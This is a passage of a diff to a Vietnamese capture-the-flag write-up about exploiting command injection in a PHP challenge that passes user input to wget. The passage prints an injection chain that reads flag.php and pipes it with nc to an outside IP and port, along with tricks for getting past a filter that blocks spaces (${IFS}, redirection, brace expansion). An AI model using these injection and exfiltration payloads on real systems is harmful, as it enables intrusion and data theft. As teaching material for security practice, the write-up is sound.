@@ -26,9 +26,9 @@ Author: yakuhito
 	- Như chúng ta có thể thấy biến `$command = "wget -q -O - https://kuhi.to/flag/" . $flag` hoàn toàn có thể cho phép chúng ta thực hiện `command injection`, cụ thể là `command1;command2|command3` với `command1` là chương trình `wget` đề cho, `command2` dùng để đọc nội dung file flag, `command3` dùng để chuyển output của `command2` ra ngoài internet. Đại loại mô hình chung sẽ là **wget -q -O - https://kuhi.to/flag/ ; cat flag.php | nc 9.9.9.9 9999** với `9.9.9.9` và `9999` là địa chỉ ip và port của chúng ta ở ngoài internet. Đến đây chúng ta sẽ cùng giải quyết 1 số vấn đề:
 	- Đọc file: để đọc được file flag.php chúng ta có thể dùng `cat` (ngoài ra có thể dùng: `tac, head, tail, sort, nl, cut, awk, sed, base64...` sở dĩ có chú thích này vì có cũng có 1 bài tương tự nhưng bài đó họ xóa hết tất cả các chương trình dùng để đọc file nên chúng ta phải tùy cơ ứng biến thôi). Tuy nhiên ở hàm **checkFlag** lại không cho phép chúng ta nhập kí tự `space`, nhưng không sao, đối với `shell injection` thì cái này bypass cũng dễ. 
 ```sh
-cat${IFS}flag.php
-cat\<flag.php
-{cat,flag.php}
+cat\$\{IFS\}flag.php
+cat<flag.php
+\{cat,flag.php\}
 ```.
 	- Ở đây vì hàm **checkFlag** chỉ cho phép nhập 7 kí tự đặc biệt này `-{_\$.}`.
 nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
